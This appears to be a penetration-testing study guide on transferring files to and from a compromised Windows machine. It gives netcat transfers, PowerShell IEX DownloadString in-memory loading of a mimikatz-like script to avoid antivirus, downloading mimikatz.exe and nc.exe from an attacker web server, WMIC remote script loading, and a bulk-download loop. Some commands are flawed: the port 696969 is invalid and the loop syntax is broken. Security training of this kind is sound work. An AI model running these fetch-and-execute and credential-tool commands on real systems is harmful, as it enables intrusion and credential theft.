# Files transfer

Once you get the initial access to a machine, one of the main issues students encounters is the lack of knowledge on how to transfer files between the attacker machine & the victim machine (and vice versa).
This simple knowledge is crucial to continue the enumeration of the victim machine, as well as to exfiltrate any important file we may encounter.
This method works on almost all versions of Windows, if the specific method doesn’t work, try the next one.

## Using Netcat

This is one of the more basic but lacking methods, as there is no timer nor indicator of the file transmission status, you need to guess the time it takes for the file to complete transmitting & after it finish, you need to make sure the file didn’t get corrupted, check the hashes of both files to validate the transmission was completed successfully.

> Set up a listener on the receiving machine, the FILENAME will be the output file.

```bash
nc -nlvp 696969 > FILENAME
```

> Send the file from the sender machine, the IP & Port of the listener needs to match & the path of the filename you want to send.

```bash
nc -nv RECIVMACHINEIP 696969 < /path/of/FILENAME
```

## Powershell

Once you landed on a low-level shell, you can start PowerShell or put the powershell.exe in front of the commands & will work as well.
You can get the files just on memory or written on disc (**DownloadString** vs **DownloadFile**), depending on your purpose.

You need to start a web server on your attacking machine to download the files from there, it’s a good & easy way to download your required files if you put them in a single path on your attacking machine & you keep them updated there.

> You can start the web server using.

```bash
Pepega@pepega[/attackMachine]$ cd /Path/of/yourfiles
Pepega@pepega[/attackMachine]$ python3 -m http.server 6969

Serving HTTP on 0.0.0.0 port 6969 (http://0.0.0.0:6969/) ...
```

> You can change the port for anyone of your choice.

### DownloadString vs DownloadFile

If you don’t want the file to touch the disk & maybe trigger an alert or the AV, just get the file in memory & us it from there.

> If you are already on a PS shell, you can avoid using powershell.exe

```PS
PS C:\Users\LilPepega> IEX (New-Object System.Net.WebClient).DownloadString('http://$IP/Invoke-catz.ps1')
```

```cmd
C:\Windows\System32> powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://$IP/Invoke-catz.ps1')
```

> The $IP is the one from your attacking machine & port of your web server.

```cmd
C:\Windows\System32> powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://$IP/mimikatz.exe', 'C:\Windows\tasks\katz.exe')
```

```PS
 PS C:\Users\LilPepega>  (New-Object System.Net.WebClient).DownloadFile('http://$IP/mimikatz.exe', 'C:\Windows\tasks\katz.exe')
```

The second path on the command is where the file is going to be downloaded, you can give it any name, but always try to use either:

- C:\Windows\tasks\
- C:\Windows\temp\

## WMIC

> Important

The WMI command-line (WMIC) utility is deprecated as of Windows 10, version 21H1, and as of the 21H1 semi-annual channel release of Windows Server. This utility is superseded by Windows PowerShell for WMI. This deprecation applies only to the WMI command-line (WMIC) utility; Windows Management Instrumentation (WMI) itself is not affected.

If the machine you are attacking still have WMIC, you can use it as follows:

```PS
PS C:\Users\LilPepega>  wmic os get /format:"http://$IP/CatoUser.bat"
```

## WGET

If Wget is installed on the system, you can use it as follows:

```PS
PS C:\Users\LilPepega> wget $IP/nc.exe -o nc.exe
```

```cmd
C:\Windows\System32> powershell wget $IP/nc.exe -o nc.exe
```

## RDP

If you have the luck to have graphical(interactive) access to the machine, via RDP, you can automatically mount a share to transfer files, this is especially useful if you are pivoting and don’t have direct access to the victim machine.

```bash
xfreerdp /v:$IP /u:USERNAME /d:DOMAIN +clipboard +drives /drive:root,/home/kali /dynamic-resolution
```

## Automating the task

We can automate the task to download multiple files just using one script, just modify the file names & run it on the victim machine.

```PS
$baseURL = "http://IP/"
$fileNames = @("File1","File2","File3")
$downloadPath = "C:\windows\tasks"

for each ($fileName in $fileNames){
    $url = $baseURL + $fileName
    $filePath = Join-Path $downloadPath $fileName
    Invoke-WebRequest -Uri $url -OutFile $filePath
    Write-Host "Downloaded $fileName to $filePath"
}

```
